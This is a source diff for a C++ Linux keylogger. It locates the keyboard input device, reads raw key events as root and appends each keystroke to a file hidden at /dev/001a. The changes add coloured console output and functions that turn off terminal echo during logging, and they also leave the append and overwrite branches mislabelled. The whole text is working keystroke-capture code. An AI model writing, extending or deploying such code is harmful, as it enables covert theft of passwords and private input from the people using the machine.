@@ -5,11 +5,13 @@
 #include <linux/input.h>  //Needed for input_event struct
 #include <fcntl.h>	//Needed for open() and O_RDONLY
 #include <unistd.h>		//For close()
+#include <termios.h> //Needed for struct termios 
 #include <errno.h>
 
 namespace logger {
 
-	std::vector<std::string> keyCodes = {
+	struct termios consoleInterface; //Needed to turn console ECHO on/off
+	std::vector<std::string> keyCodes = { //List of keyboard scancodes
 		"KEYBOARD ERROR",
 		"ESC",
 		"1",
@@ -145,7 +147,7 @@ namespace logger {
 		std::string result = "";
 
 		FILE * pipe = popen("cat /proc/bus/input/devices", "r");		
-		if (verbose) std::cout << "Executing command cat /proc/bus/input/devices" << std::endl;
+		if (verbose) std::cout << "Executing command: \x1B[32m" << "cat /proc/bus/input/devices" << "\x1B[0m" << std::endl;
 		if (!pipe) {
 			std::cout << "popen failed! Aborting program!" << std::endl;
 			exit(1);
@@ -182,12 +184,12 @@ namespace logger {
 			std::cout << "regex search returned no match! Aborting!" << std::endl;
 			exit(1);
 		}
-		if (verbose) std::cout << "Regex search return: " << m[0] << std::endl;
+		if (verbose) std::cout << "Regex search return: \x1B[32m" << m[0] << "\x1B[0m" << std::endl;
 		if (verbose) std::cout << "Creating path to handler." << std::endl;
 		std::string matched = m[0];
 		size_t pos = matched.find("event");
 		handler = "/dev/input/" + matched.substr (pos);
-		if (verbose) std::cout << "Path: " << handler << std::endl;
+		if (verbose) std::cout << "Path: \x1B[32m" << handler << "\x1B[0m" << std::endl;
 
 		return handler;
 	}
@@ -197,6 +199,45 @@ namespace logger {
 		return file.good();
 	}
 
+	void disableEcho(bool verbose=false) {
+		if (verbose) std::cout << "Disabling console ECHO"<<std::endl;
+
+		// ECHO is the mask name associated with the struct termios that enable/disables echo
+		int errCheck = tcgetattr(fileno(stdin), &consoleInterface); //get the parameters associated with the terminal
+		
+		if (errCheck == -1) {
+			std::cout << "Error: \x1B[31m" << std::strerror(errno) << "\x1B[0m" << std::endl;
+			std::cout << "Failure getting console parameters! Can't disable console ECHO!" << std::endl;
+		}
+		consoleInterface.c_lflag &= ~ECHO; //flips the bit for ECHO thereby disabling it.
+		
+		errCheck = tcsetattr(fileno(stdin), 0, &consoleInterface); // set the parameters for the terminal
+		if (errCheck == -1) {
+			std::cout << "Error: \x1B[31m" << std::strerror(errno) << "\x1B[0m" <<std::endl;
+			std::cout << "Failure setting console parameters! Can't disable console ECHO!" << std::endl;
+		}
+		return;
+	}
+
+	void enableEcho(bool verbose=false) {
+		if (verbose) std::cout << "Enabling console ECHO" << std::endl;
+		
+		int errCheck = tcgetattr(fileno(stdin), &consoleInterface); //get the parameters for the terminal
+		if (errCheck == -1) {
+			std::cout << "Error: \x1B[31m" << std::strerror(errno) << "\x1B[0m" << std::endl;
+			std::cout << "Failure getting console parameters! Can't enable console ECHO!" << std::endl;
+		}
+
+		consoleInterface.c_lflag |= ECHO; //flips the bit for ECHO thereby enabling it.
+		
+		errCheck = tcsetattr(fileno(stdin), 0, &consoleInterface);  // set the parameters for the terminal
+		if (errCheck == -1) {
+			std::cout << "Error: \x1B[31m" << std::strerror(errno) << "\x1B[0m" << std::endl;
+			std::cout << "Failure setting console parameters! Can't enable console ECHO!" << std::endl;
+		}
+		return;
+	}
+
 	void connectHandler (std::string handler, bool verbose=false) {
 		const char * fileName = handler.c_str();
 		struct input_event holdEvent;
@@ -204,7 +245,7 @@ namespace logger {
 		int fd = open (fileName, O_RDONLY);
 
 		if (fd == -1) {
-			std::cout << "Error: " << std::strerror(errno) << std::endl;
+			std::cout << "Error: \x1B[31m" << std::strerror(errno) << "\x1B[0m" << std::endl;
 			std::cout << "Tip: Be sure to run the program using sudo." << std::endl;
 			std::cout << "Failed to connect to handler! Aborting!" << std::endl;
 			exit(1);
@@ -217,23 +258,25 @@ namespace logger {
 		}
 
 		std::ofstream logFile;
-		if (fileExist ("/dev/001a")) {
-			if (verbose) std::cout << "Creating new file: /dev/001a" << endl;
+		if (!fileExist ("/dev/001a")) {
+			if (verbose) std::cout << "Creating new file: \x1B[32m" << "/dev/001a" << "\x1B[0m" << std::endl;
 			logFile.open("/dev/001a", std::ios_base::app);
 		}
 		else {
-			if (verbose) std::cout <<  "Appending to file: /dev/001a" << endl;
+			if (verbose) std::cout <<  "Appending to file: \x1B[32m" << "/dev/001a" << "\x1B[0m" << std::endl;
 			logFile.open("/dev/001a", std::ios::out);
 		} 
 
 		if (verbose) std::cout << "To exit press ESC." << std::endl;
+		if (verbose) disableEcho(verbose);
 		while (true) {
 			read(fd, &holdEvent, sizeof(holdEvent));
 			
 			if (holdEvent.type == EV_KEY and holdEvent.value == 1) {
 				if (verbose) {
-					std::cout << "holdEvent.code: " << holdEvent.code << "\t";
-					std::cout << "KeyCode: " << keyCodes[holdEvent.code] << std::endl;
+					// '\x1B[1m' and '\x1B[0m' allows for bolding in console window. These can be safely removed without damaging computer
+					std::cout << "holdEvent.code: \x1B[1m" << holdEvent.code << "\x1B[0m\t";
+					std::cout << "KeyCode: \x1B[1m" << keyCodes[holdEvent.code] << "\x1B[0m" <<std::endl;
 					logFile << keyCodes[holdEvent.code];
 				}
 				else {
@@ -245,7 +288,8 @@ namespace logger {
 				break;
 			}
 		}
-		if (verbose) std::cout << "Closing /dev/001a" << std::endl;
+		if (verbose) enableEcho(verbose);
+		if (verbose) std::cout << "Closing \x1B[32m" << "/dev/001a" << "\x1B[0m" << std::endl;
 		logFile.close();
 
 		if (verbose) std::cout << "Closed connection to handler." << std::endl;
